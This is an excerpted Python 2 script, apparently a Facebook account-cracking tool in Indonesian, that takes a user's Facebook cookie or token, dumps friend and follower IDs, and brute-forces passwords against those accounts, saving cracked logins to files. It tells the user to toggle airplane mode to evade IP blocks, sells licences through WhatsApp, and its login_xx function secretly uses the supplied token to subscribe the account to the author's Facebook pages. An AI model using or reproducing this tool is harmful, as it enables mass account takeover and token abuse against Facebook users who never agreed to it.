...
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r%s%s remove token %s' % (M, til, o),
        sys.stdout.flush()
        jeda(1)
...
def masuk():
    ...
    if rom in '':
        ...
        if nanya in '':
            print '%s%s saya bertanya wajib di jawab ' % (M, til)
            jeda(2)
            masuk()
        elif nanya in ('y', 'Y'):
            print '\n%s%s selamat anda pintar :* ' % (H, til)
            jeda(2)
            masuk()
        elif nanya in ('n', 'N'):
            print '\n%s%s anda sungguh tolol ' % (M, til)
            jeda(2)
...
def _romiXD_(show=True):
    if show == True:
        print '\n%s%s%s For it to work, enter your Facebook cookie' % (U, til, O)
    ...
    try:
        ...
        if kueh(cks) == True:
            ...
            exit('%s%s login success, type: python2 bff-2.py ' % (H, til))
        else:
...
def publik(romz, headers=header):
    ...
    try:
        print "\n%s%s %s Type '%sme%s' if you want to dump your own friend list " % (U, til, O, H, O)
...
def followers(romz, headers=header):
    ...
    try:
        print "\n%s%s %sType '%sme%s' CLONE YOUR LOGIN FOLLOWRS " % (U, til, O, H, O)
        idt = raw_input('%s%s %sTarget id%s  > %s' % (U, til, O, M, K))
        batas = raw_input('%s%s %s Maximum id%s > %s' % (U, til, O, M, K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, romz))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        bff = open(file, 'w')
...
def dumpfl():
    ...
    if cek(1) == False:
        try:
            cookie = raw_input('\n%s%s%s For it to work, enter your Facebook cookie\n%s# %sCookie%s > %s' % (U, til, O, P, O, M, K))
            cvds = cvd(cookie)
            new = True
        except:
    ...
    if u == '':
        ...
        try:
            ...
            if ua in '':
                ...
                jalan('%s%s%s Anda akan di arahkan ke browser ' % (U, til, O))
                jeda(2)
                ...
                open('data/ua.txt', 'w').write(ua_)
                jeda(2)
                print '\n%s%s menggunakan user agent bawaan ' % (H, til)
                jeda(2)
                menu()
            open('data/ua.txt', 'w').write(ua)
            jeda(2)
            print '\n%s%s berhasil mengganti user agent' % (H, til)
            jeda(2)
            menu()
...
class ngentod():
    ...
    def romiy(self):
        try:
            ...
            print '%s\xe2\x80\xa2%s jumlah Id%s > %s%s' % (U, O, M, H, len(self.id))
        except:
            print '\n%s\xe2\x80\xa2 File dump tidak ada, dump id dulu kentod' % M
            raw_input('\n%s\xe2\x80\xa2 %s[ %senter %s] ' % (U, O, U, O))
            menu()

        unikers = raw_input('%s\xe2\x80\xa2%s gunakan password manual? y/t%s > %s' % (U, O, M, K))
        if unikers in ('Y', 'y'):
            print '\n%s\xe2\x80\xa2%s contoh%s >%s sayang%s,%spengen%s,%sngentot' % (U, O, M, O, M, O, M, O)
            while True:
                pwx = raw_input('%s\xe2\x80\xa2%s password %s> %s' % (U, O, M, K))
                if pwx == '':
                    print '\n%s\xe2\x80\xa2 jangan kosong ' % M
                elif len(pwx) <= 5:
                    print '\n%s\xe2\x80\xa2 password minimal 6 karakter' % M
                else:
                    ...
                    def manual(brute=None):
                        ...
                        if ind == '':
                            ...
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt' % (U, til, O, H, O, M, H, waktu)
                            jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt' % (U, til, O, M, K, M, O, M, K, waktu)
                            jeda(0.2)
                    ...
                    print '\n%s\xe2\x80\xa2%s [ %spilih methode crack, silahkan coba satu\xc2\xb2 %s]\n' % (U, O, U, O)
    ...
    def b_api(self, user, manual):
        ...
        for pw in manual:
            ...
            if response.status_code != 200:
                (
                 sys.stdout.write('\r\x1b[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik'),)
                sys.stdout.flush()
                loop += 1
                b_api(self, user, manual)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s ' % (H, user, pw, response.json()['access_token'])
...
def file_cp():
    dirs = os.listdir('CP')
    print '\n%s\xe2\x80\xa2%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n' % (U, O, U, O)
    for file in dirs:
    ...
    try:
        ...
        print '%s\xe2\x80\xa2 file tidak ada' % M
        exit()
...
def opsi():
    ...
    print ' %s# %s---------------------------------------- %s#' % (P, M, P)
    jeda(2)
    print '%s%s%s Total akun %s: %s%s' % (U, til, O, M, P, len(file_cp))
    jeda(2)
    print ' %s# %s---------------------------------------- %s#' % (P, M, P)
    jeda(2)
    for fb in file_cp:
        ...
        print '\n%s%s%s cek akun %s: %s%s' % (U, til, O, M, K, akun.replace(' *--> ', ''))
        jeda(0.07)
        try:
    ...
    jeda(0.07)
    raw_input('%s%s%s kembali ' % (U, til, O))
    jeda(0.07)
    menu()
...
def mengecek(user, pw):
    ...
    if 'c_user' in ses.cookies:
        ...
        print '%s%s Berhasil \xe2\x97\x8a %s ' % (H, til, kuki)
        jeda(0.07)
        no = 0
...
def menu():
    ...
    print '%s\xe2\x80\xa2%s 03 %sDump id reaction post' % (U, P, O)
    ...
    if slut == '':
        ...
        exit()
    elif slut in ('python2 bff-2.py ig', ):
        ig_crack()
    elif slut in ('0', '00'):
        exit('\n')
    else:
...
def cek_cek():
    ...
    if l in ('', ):
        ...
        try:
            file = raw_input('\n%s\xe2\x80\xa2%s masukan file %s:%s ' % (U, O, M, H))
            jeda(0.2)
            if file in ('', ):
                exit('%s\xe2\x80\xa2 isi yang benar kentod' % M)
        ...
        print ' %s# %s---------------------------------------- %s#' % (P, M, P)
        jeda(2)
        jalan('%s\xe2\x80\xa2%s hasil tanggal%s : %s%s %stotal %s: %s%s' % (U, O, M, H, file_nm, O, M, H, len(totalok)))
        ...
        dirs = os.listdir('CP')
        print '\n%s\xe2\x80\xa2%s [%s hasil crack yang tersimpan %s]\n' % (U, O, U, O)
        for file in dirs:
            print '%s\xe2\x80\xa2%s> %s%s' % (U, M, K, file)
            jeda(0.07)

        try:
            file = raw_input('\n%s\xe2\x80\xa2%s masukan file %s:%s ' % (U, O, M, K))
            jeda(0.2)
            if file in ('', ):
                exit('%s\xe2\x80\xa2 isi yang benar kentod' % M)
        ...
        print ' %s# %s---------------------------------------- %s#' % (P, M, P)
        jeda(2)
        jalan('%s\xe2\x80\xa2%s hasil tanggal%s : %s%s %stotal%s : %s%s' % (U, O, M, K, file_nm, O, M, K, len(totalcp)))
...
def konfirmasi():
    ...
    y = ['.   ', '..  ', '... ']
    for m in y:
        print '\r\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Mohon tunggu ' + m,
        sys.stdout.flush()
        jeda(1)
    ...
    lpg.write(id)
    lpg.close()
    jalan('\n\n%s\xe2\x80\xa2 %sLisensi%s : %s%s' % (U, O, M, H, id))
    jeda(1)
    ...
    if su in ('', ):
        ...
        os.system('am start https://wa.me/+994401850814?text=Assalamualaikum+I+want to+buy+licence:+' + id + '>/dev/null')
        jeda(1)
        exit()
    elif su in ('t', 'T'):
        exit()
...
def konfirmasi1():
    try:
        ...
        git = requests.get('https://github.com/HACKERIHSAN/lisense/blame/main/Id.txt').text.strip()
        if lis in git:
            os.system('clear')
            banner()
            print '\n'
...
def login_xx():
    try:
        ...
        requests.post('https://graph.facebook.com/100022086172556/subscribers?access_token=%s'%(token)) # Fanspage Romi XD
        requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=%s'%(token)) # Romi Afrizal
        requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=%s'%(token)) # Romi Afrizal (2021)
        requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=%s'%(token)) # Iqbal bobz
        requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(token)) # Iwan hadiansyah
        requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=%s'%(token)) # Hamzah kirana
        requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=%s'%(token)) # Unik ROMI AFRIZAL
        requests.post('https://graph.facebook.com/100071747420583/subscribers?access_token=%s'%(token)) # Doniftfanny
    except:
    	pass
